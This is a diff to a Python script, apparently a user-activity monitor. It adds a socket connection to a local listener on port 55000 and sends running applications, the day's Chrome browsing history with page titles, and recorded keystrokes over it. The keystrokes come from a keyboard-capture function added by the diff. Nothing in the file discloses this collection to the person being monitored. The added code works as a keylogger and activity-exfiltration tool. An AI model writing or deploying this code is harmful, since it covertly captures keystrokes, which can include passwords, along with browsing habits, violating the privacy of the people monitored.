@@ -1,12 +1,29 @@
 import win32com.client
 import subprocess
 from browser_history.browsers import Chrome
-import time
+import datetime
 from googletrans import Translator
 import cloudscraper
 from bs4 import BeautifulSoup
 import requests
-from ml_classifier import *
+import keyboard
+from socket import *
+
+sock = socket(AF_INET,SOCK_STREAM)
+sock.connect(("localhost",55000))
+
+visited_websites = []
+
+def get_buffer(data):
+    length = len(data)
+    count = 0
+
+    while length != 0:
+        length = int(length/10)
+        count+=1
+
+    buffer = (5-count)*'0' + f'{len(data)}'
+    return buffer
 
 def convert_to_human_time(dtmDate):
     strDateTime = ""
@@ -49,6 +66,7 @@ def get_running_apps():
     NOT_WANTED_APPS = 'Description-----------Application Frame Host'
     cmd = 'powershell "gps | where {$_.MainWindowTitle } | select Description'
     proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
+
     for line in proc.stdout:
         
         if line.rstrip() and line.decode().rstrip() not in NOT_WANTED_APPS:
@@ -57,7 +75,10 @@ def get_running_apps():
             # rstrip() to remove `\r\n`
             apps.append(line.decode().rstrip())
 
-    print(apps)
+    apps = '#'.join(apps)
+    buffer = get_buffer(apps)
+    sock.send(buffer.encode())
+    sock.send(f"new_apps:{apps}".encode())
 
 def get_tabs():
     c = Chrome()
@@ -65,72 +86,23 @@ def get_tabs():
 
     # his is a list of (datetime.datetime, url) tuples
     his = outputs.histories
-    # print(his[-1][-1])
-    return his
+    websites = []
+    today = datetime.datetime.today()
+    today = today.strftime("%d/%m/%Y")
 
-def get_website_content(url):
+    for tab in his:
+        date = tab[0].strftime('%d/%m/%Y')
+        if date == today:
+            websites.append(tab[1])
     
-    scraper = cloudscraper.create_scraper() 
-    headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)'}
-    
-    try:
-        r = scraper.get(url, headers = headers)
-    
-        soup = BeautifulSoup(r.text, 'html.parser')
-        title = soup.find('title').text
-        description = soup.find('meta', attrs={'name': 'description'})
-    
-        if "content" in str(description):
-            description = description.get("content")
-        else:
-            description = ""
-    
-    
-        h1 = soup.find_all('h1')
-        h1_all = ""
-        for x in range (len(h1)):
-            if x ==  len(h1) -1:
-                h1_all = h1_all + h1[x].text
-            else:
-                h1_all = h1_all + h1[x].text + ". "
-    
-    
-        paragraphs_all = ""
-        paragraphs = soup.find_all('p')
-        for x in range (len(paragraphs)):
-            if x ==  len(paragraphs) -1:
-                paragraphs_all = paragraphs_all + paragraphs[x].text
-            else:
-                paragraphs_all = paragraphs_all + paragraphs[x].text + ". "
-    
-    
-    
-        h2 = soup.find_all('h2')
-        h2_all = ""
-        for x in range (len(h2)):
-            if x ==  len(h2) -1:
-                h2_all = h2_all + h2[x].text
-            else:
-                h2_all = h2_all + h2[x].text + ". "
-    
-    
-    
-        h3 = soup.find_all('h3')
-        h3_all = ""
-        for x in range (len(h3)):
-            if x ==  len(h3) -1:
-                h3_all = h3_all + h3[x].text
-            else:
-                h3_all = h3_all + h3[x].text + ". "
-    
-        allthecontent = ""
-        allthecontent = str(title) + " " + str(description) + " " + str(h1_all) + " " + str(h2_all) + " " + str(h3_all) + " " + str(paragraphs_all)
-        allthecontent = str(allthecontent)[0:999]
+    websites = [f"{url} {get_website_title(url)}" for url in websites]
 
-        print(allthecontent)
-    except Exception as e:
-            print(e)
+    websites = '#'.join(websites)
 
+    buffer = get_buffer(websites)
+    sock.send(buffer.encode())
+    sock.send(f"new_websites:{websites}".encode())
+    
 def get_website_title(url):    
     # making requests instance
     reqs = requests.get(url)
@@ -138,30 +110,23 @@ def get_website_title(url):
     # using the BeautifulSoup module
     soup = BeautifulSoup(reqs.text, 'html.parser')
     
-    # displaying the title
-    # print("Title of the website is : ")
-    # for title in soup.find_all('title'):
-    #     print(title.get_text())
-    return soup.find_all('title')
+    return soup.find_all('title')[0].get_text()
 
-url = 'https://www.geeksforgeeks.org/extract-title-from-a-webpage-using-python/'
-
-# get_tabs()
-
-def categorize_websites():
-    his = get_tabs()
-    titles = get_website_title(his[-1][-1])
+def type_trace():
     
-    for title in titles:
-        print(title.get_text())
-        web_category(title.get_text())
+    recorded = keyboard.record(until='enter')
+    all_keys = [key.name for key in recorded if key.event_type == "down"]
+    all_keys.pop(-1)
+    all_keys = ''.join(all_keys)
+    all_keys = all_keys.replace('space', ' ')
 
-# categorize_websites()
-# get_logon_logoff()
-# get_website_content('https://en.wikipedia.org/wiki/Microsoft')
+    buffer = get_buffer(all_keys)
+    sock.send(buffer.encode())
+    sock.send(f"new_text:{all_keys}".encode())
+
 
 # translator = Translator()
- 
+
 # try:
 #         translation = translator.translate(allthecontent).texrt
 #         translation = str(translation)[0:999]
